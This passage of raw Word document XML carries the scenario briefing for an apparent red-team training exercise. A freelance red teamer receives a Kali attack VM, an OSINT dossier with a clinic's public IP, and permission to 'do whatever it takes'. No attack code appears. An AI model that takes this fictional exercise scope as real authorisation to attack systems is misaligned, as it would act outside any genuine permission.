        <w:t xml:space="preserve">k, Deanna </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ic</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ed her te</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>rver r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>lo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. She </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>alled in a favor from a friend at C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>berSe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ps</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hat fr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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spacing w:val="-3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d handed the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ase</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="2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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>—</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a freelance red te</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>am</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>er brought in to si</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ate </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">hat might </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>if th</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>viron</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="3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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ere com</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>You’ve</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>been</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>given</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Kali at</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>k V</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, an OSINT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ier revealing</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>lini</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>’s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ublic</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>IP, and the green</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="28"/>
        <w:ind w:left="1080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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">light </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">o do </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hatever it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>kes</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="2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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="3"/>
          <w:sz w:val="24"/>
